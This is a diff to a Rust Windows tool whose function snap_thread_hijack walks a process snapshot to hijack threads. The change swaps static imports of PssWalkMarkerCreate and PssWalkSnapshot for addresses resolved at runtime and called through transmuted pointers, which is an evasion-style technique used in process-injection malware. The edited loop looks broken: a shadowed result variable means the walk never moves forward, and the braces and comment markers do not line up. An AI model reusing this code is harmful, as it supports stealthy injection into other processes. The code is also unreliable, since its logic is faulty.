@@ -30,9 +30,7 @@ use winapi::{
 
 // Windows-rs imports
 use windows::Win32::System::Diagnostics::ProcessSnapshotting::{
-    PssWalkMarkerCreate, PssWalkMarkerFree, PssWalkSnapshot, HPSS, HPSSWALK, PSS_CAPTURE_FLAGS,
-    PSS_CAPTURE_THREADS, PSS_CAPTURE_THREAD_CONTEXT, PSS_THREAD_ENTRY, PSS_VA_SPACE_ENTRY,
-    PSS_WALK_THREADS, PSS_WALK_VA_SPACE,
+    PssWalkMarkerCreate, PssWalkMarkerFree, PssWalkSnapshot, HPSS, HPSSWALK, PSS_ALLOCATOR, PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREADS, PSS_CAPTURE_THREAD_CONTEXT, PSS_THREAD_ENTRY, PSS_VA_SPACE_ENTRY, PSS_WALK_INFORMATION_CLASS, PSS_WALK_THREADS, PSS_WALK_VA_SPACE
 };
 
 pub fn get_helper(
@@ -342,27 +340,65 @@ pub fn snap_thread_hijack(
         }
         //println!("[+] Snapshot captured successfully");
 
-        //YOU ARE HERE
+        //get the function address for PssWalkMarkerCreate
+        let pss_walk_marker_create_address =
+            noldr::get_function_address(kernel32, "PssWalkMarkerCreate");
 
-        // Create walk marker
-        let pss_result = PssWalkMarkerCreate(None, &mut walk_marker_handle);
+        //define the function signature
+        type PssWalkMarkerCreateFn = unsafe extern "system" fn(
+            *const PSS_ALLOCATOR,
+            *mut HPSSWALK
+        ) -> u32;
+
+        //call the function
+        let pss_result = unsafe {
+            std::mem::transmute::<_, PssWalkMarkerCreateFn>(
+                match pss_walk_marker_create_address {
+                    Some(addr) => addr,
+                    None => return false,
+                }
+            )(std::ptr::null(), &mut walk_marker_handle)
+        };
+        
         if pss_result != 0 {
             eprintln!(
                 "[!] PssWalkMarkerCreate failed: Win32 error {}",
-                winapi::um::errhandlingapi::GetLastError()
+                unsafe { winapi::um::errhandlingapi::GetLastError() }
             );
             return false;
         }
-        //println!("[+] Walk marker created successfully");
 
-        // Walk through threads
-        let mut pss_result = PssWalkSnapshot(
-            snapshot_handle,
-            PSS_WALK_THREADS,
-            walk_marker_handle,
-            Some(&mut buffer),
-        );
+        //get the function address for PssWalkSnapshot
+        let pss_walk_snapshot_address =
+            noldr::get_function_address(kernel32, "PssWalkSnapshot");
 
+        //define the function signature
+        type PssWalkSnapshotFn = unsafe extern "system" fn(
+            HPSS,
+            PSS_WALK_INFORMATION_CLASS,
+            HPSSWALK,
+            *mut std_c_void,
+            DWORD  // Added BufferLength parameter
+        ) -> u32;
+
+        //call the function
+        let mut pss_result = unsafe {
+            std::mem::transmute::<_, PssWalkSnapshotFn>(
+                match pss_walk_snapshot_address {
+                    Some(addr) => addr,
+                    None => return false,
+                }
+            )(
+                snapshot_handle, 
+                PSS_WALK_THREADS, 
+                walk_marker_handle, 
+                buffer.as_mut_ptr() as *mut std_c_void,
+                buffer.len() as DWORD
+            )
+        };
+
+        //YOU ARE HERE
+       
         while pss_result == 0 {
             // Copy buffer to thread_entry
             std::ptr::copy_nonoverlapping(
@@ -418,6 +454,24 @@ pub fn snap_thread_hijack(
                 }
             }
 
+            //swap in our dynamic resolved veresion of PssWalkSnapshot instead of the one below that uses a crate
+
+            let pss_result = unsafe {
+                std::mem::transmute::<_, PssWalkSnapshotFn>(
+                    match pss_walk_snapshot_address {
+                        Some(addr) => addr,
+                        None => return false,
+                    }
+                )(
+                    snapshot_handle, 
+                    PSS_WALK_THREADS, 
+                    walk_marker_handle, 
+                    buffer.as_mut_ptr() as *mut std_c_void,
+                    buffer.len() as DWORD
+                )
+                };
+            }
+/* 
             pss_result = PssWalkSnapshot(
                 snapshot_handle,
                 PSS_WALK_THREADS,
@@ -425,7 +479,7 @@ pub fn snap_thread_hijack(
                 Some(&mut buffer),
             );
         }
-
+*/
         // Free walk marker
         let pss_result = PssWalkMarkerFree(walk_marker_handle);
         if pss_result != 0 {
